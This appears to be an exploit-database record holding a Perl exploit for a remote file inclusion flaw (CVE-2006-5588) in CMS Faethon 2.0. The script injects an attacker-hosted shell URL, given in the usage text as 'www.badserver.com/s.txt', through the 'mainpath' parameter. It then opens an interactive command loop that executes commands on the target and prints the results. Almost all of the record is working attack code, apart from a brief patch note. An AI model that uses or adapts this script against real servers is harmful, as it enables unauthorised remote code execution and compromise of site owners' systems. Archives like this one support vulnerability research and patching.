{
  "id": "2632",
  "title": "CMS Faethon 2.0 - &#039;mainpath&#039; Remote File Inclusion",
  "cve": "CVE-2006-5588",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n\r\n#####################################################################################################\r\n#                                                                                                   #\r\n# CMS Faethon 2.0 Ultimate                                                                          #\r\n#                                                                                                   #\r\n# Class:  Remote/Local File Include Vulnerability                                                   #\r\n#                                                                                                   #\r\n# Date:   2006/10/24                                                                                #\r\n#                                                                                                   #\r\n# Remote: Yes                                                                                       #\r\n#                                                                                                   #\r\n# Type:   Highly critical                                                                           #\r\n#                                                                                                   #\r\n# Vendor: www.cmsfaethon.org                                                                \t    #\r\n#                                                                                                   #\r\n# Download: http://cmsfaethon.org/downloads/                                            \t    #\r\n#                                                                                                   #\r\n# Note: Successful exploitation requires register_globals = on and magic_quotes_gpc = on            #\r\n#                                                                                                   #\r\n# Discovered & Exploit by: r0ut3r (writ3r [at] gmail.com)                                           #\r\n#                                                                                                   #\r\n# Exploit: cmsfaethon2_xpl.pl                                                                       #\r\n#                                                                                                   #\r\n# Vulnerable code config.php                                                                        #\r\n# require($mainpath . '../config.php');                                                             #\r\n#                                                                                                   #\r\n# Vulnerable code rss-reader.php                                                                    #\r\n# if(isset($_GET['rss'])) { $source = $_GET['rss']; }                                               #\r\n#                                                                                                   #\r\n# // include lastRSS                                                                                #\r\n# include($mainpath.'lib/class.lastrss.php');                                                       #\r\n# include($mainpath.'lib/functions_AutoCzech.php');                                                 #\r\n#                                                                                                   #\r\n# Comments:                                                                                         #\r\n# Whats happenin tgo.                                                                               #\r\n# Good lookin out with that last exploit too str0ke                                                 #\r\n#                                                                                                   #\r\n#####################################################################################################\r\n\r\nuse LWP::UserAgent;\r\nuse LWP::Simple\r\n\r\n$target = @ARGV[0];\r\n$shellsite = @ARGV[1];\r\n$shellcmd = @ARGV[2];\r\n$fileno = @ARGV[3];\r\n\r\nif(!$target || !$shellsite)\r\n{\r\n    usage();\r\n}\r\n\r\nheader();\r\n\r\nif ($fileno eq 1)\r\n{\r\n    $file = \"/admin/config.php?mainpath=\";\r\n}\r\nelsif ($fileno eq 2)\r\n{\r\n    $file = \"/includes/rss-reader.php?mainpath=\";\r\n}\r\nelse\r\n{\r\n    $file = \"/admin/config.php?mainpath=\";\r\n}\r\n\r\nif (@ARGV[5] eq \"-p\")\r\n    {\r\n    print q\r\n    {\r\n########################################################################\r\n            Apply the following code to both files below:\r\n1: admin/config.php\r\n2: includes/rss-reader.php\r\n\r\nif(basename(__FILE__) == basename($_SERVER['PHP_SELF']))\r\n    die();\r\n\r\nNOTE: Patch hasn't been tested, but it should work. The code denies\r\ndirect access to the files it is applied to.\r\n########################################################################\r\n    }\r\n    }\r\n\r\nprint \"Type 'exit' to quit\";\r\nprint \"[cmd]\\$\";\r\n$cmd = <STDIN>;\r\n\r\nwhile ($cmd !~ \"exit\")\r\n{\r\n    $xpl = LWP::UserAgent->new() or die;\r\n        $req =\r\nHTTP::Request->new(GET=>$target.$file.$shellsite.'?&'$shellcmd.'='.$cmd)\r\nor die(\"\\n\\n Failed to connect.\");\r\n        $res = $xpl->request($req);\r\n        $r = $res->content;\r\n        $r =~ tr/[\\n]/[&#234;]/;\r\n\r\n    if (@ARGV[4] eq \"-r\")\r\n    {\r\n        print $r;\r\n    }\r\n\r\n    print \"[cmd]\\$\";\r\n    $cmd = <STDIN>;\r\n}\r\n\r\nsub header()\r\n{\r\n    print q\r\n    {\r\n########################################################################\r\n        CMS Faethon 2.0 Ultimate - Remote File Include Exploit\r\n            Vulnerability discovered and exploit by r0ut3r\r\n                        writ3r [at] gmail.com\r\n          For CMS Faethon administrator testing purposes only!\r\n########################################################################\r\n    };\r\n}\r\n\r\nsub usage()\r\n{\r\n    header();\r\n    print q\r\n    {\r\n########################################################################\r\nUsage:\r\nperl cmsfaethon2_xpl.pl <Target website> <Shell Location> <CMD Variable> <f> <-r> <-p>\r\n<Target Website> - Path to target eg: www.faethon.target.com\r\n<Shell Location> - Path to shell eg: www.badserver.com/s.txt\r\n<CMD Variable> - Shell command variable name eg: cmd\r\n<f> - Vulnerable file number, corresponding to:\r\n1: config.php\r\n2: rss-reader.php\r\n<r> - Show output from shell\r\n<p> - Display patch\r\nExample:\r\nperl cmsfaethon2_xpl.pl http://localhost http://localhost/s.txt cmd 1 -r -p\r\n########################################################################\r\n    };\r\n    exit();\r\n}\r\n\r\n# milw0rm.com [2006-10-24]",
  "url": "https://www.exploit-db.com/exploits/2632"
}